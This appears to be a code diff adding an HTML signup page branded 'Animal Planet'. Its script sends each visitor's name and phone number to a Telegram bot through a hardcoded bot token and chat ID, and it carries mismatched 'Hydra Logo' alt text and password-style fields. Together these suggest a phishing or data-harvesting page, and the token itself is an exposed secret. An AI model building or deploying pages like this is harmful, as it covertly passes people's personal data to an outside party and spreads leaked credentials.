@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Animal Planet Signup</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+        }
+
+        body, html {
+            height: 100%;
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: #fff;
+            color: #333;
+        }
+
+        .container {
+            background: #fff;
+            padding: 50px;
+            border-radius: 12px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 450px;
+            text-align: center;
+        }
+
+        .container .logo img {
+            width: 100px;
+            margin-bottom: 20px;
+        }
+
+        h1 {
+            font-size: 28px;
+            color: #333;
+            margin-bottom: 10px;
+        }
+
+        p {
+            color: #777;
+            margin-bottom: 30px;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+            text-align: left;
+            position: relative;
+        }
+
+        label {
+            font-size: 14px;
+            color: #333;
+            margin-bottom: 8px;
+            display: block;
+        }
+
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 14px;
+            background-color: #f9f9f9;
+            outline: none;
+            transition: border-color 0.3s ease;
+        }
+
+        input[type="text"]:focus,
+        input[type="password"]:focus {
+            border-color: #333;
+        }
+
+        .eye-icon {
+            position: absolute;
+            right: 15px;
+            top: 35px;
+            cursor: pointer;
+            font-size: 18px;
+        }
+
+        .options {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 30px;
+        }
+
+        .remember-me {
+            display: flex;
+            align-items: center;
+        }
+
+        .remember-me input {
+            margin-right: 8px;
+        }
+
+        .remember-me label {
+            font-size: 14px;
+            color: #555;
+            cursor: pointer;
+        }
+
+        .forgot-password a {
+            font-size: 14px;
+            color: #333;
+            text-decoration: none;
+            transition: color 0.3s ease;
+        }
+
+        .forgot-password a:hover {
+            color: #000;
+        }
+
+        .signup-button {
+            width: 100%;
+            padding: 12px;
+            border: none;
+            background-color: #333;
+            color: #fff;
+            font-size: 16px;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-weight: bold;
+        }
+
+        .signup-button:hover {
+            background-color: #555;
+            transform: scale(1.05);
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="https://firebasestorage.googleapis.com/v0/b/sushiljat01-af741.appspot.com/o/IMG-20240723-WA0000.jpg?alt=media&token=39b95740-27c4-4dc2-942c-a26713731db2" alt="Hydra Logo">
+        </div>
+        <h1>Animal Planet</h1>
+        <p>Please enter your details</p>
+        <form id="signupForm">
+            <div class="input-group">
+                <label for="fullname">Your Name</label>
+                <input type="text" id="fullname" name="fullname">
+            </div>
+            <div class="input-group">
+                <label for="mobile">Phone Number</label>
+                <input type="password" id="mobile" name="mobile">
+                <span class="eye-icon" onclick="togglePassword()">👁️</span> <!-- Eye Icon -->
+            </div>
+            <div class="options">
+                <div class="remember-me">
+                    <input type="checkbox" id="remember">
+                    <label for="remember">Remember for 30 days</label>
+                </div>
+                <div class="forgot-password">
+                    <a href="#">Forgot Password?</a>
+                </div>
+            </div>
+            <button type="submit" class="signup-button">Sign Up</button>
+        </form>
+    </div>
+
+    <script>
+        function togglePassword() {
+            const mobileInput = document.getElementById('mobile');
+            const eyeIcon = document.querySelector('.eye-icon');
+            if (mobileInput.type === 'password') {
+                mobileInput.type = 'text';
+                eyeIcon.textContent = '🙈';
+            } else {
+                mobileInput.type = 'password';
+                eyeIcon.textContent = '👁️';
+            }
+        }
+
+        document.addEventListener('DOMContentLoaded', () => {
+            if (localStorage.getItem('signedUp')) {
+                window.location.href = 'index.html';
+            }
+        });
+
+        document.getElementById('signupForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+            const fullname = document.getElementById('fullname').value;
+            const mobile = document.getElementById('mobile').value;
+
+            if (!/^\d{10}$/.test(mobile)) {
+                alert('Please enter a valid 10-digit mobile number.');
+                return;
+            }
+
+            // Send data to Telegram bot
+            const botToken = '7455670410:AAFyu4dCgrvfZXhrwRf9WAjn7g1mJyKnqdQ';  // Replace with your Telegram bot token
+            const chatId = '1691680798';      // Replace with your Telegram chat ID
+            const message = `New sign-up:\nFull Name: ${fullname}\nMobile Number: ${mobile}`;
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        localStorage.setItem('signedUp', true);
+                        window.location.href = 'index.html';
+                    } else {
+                        alert('Failed to sign up. Please try again.');
+                    }
+                })
+                .catch(error => {
+                    alert('An error occurred. Please try again.');
+                    console.error('Error:', error);
+                });
+        });
+    </script>
+</body>
+</html>
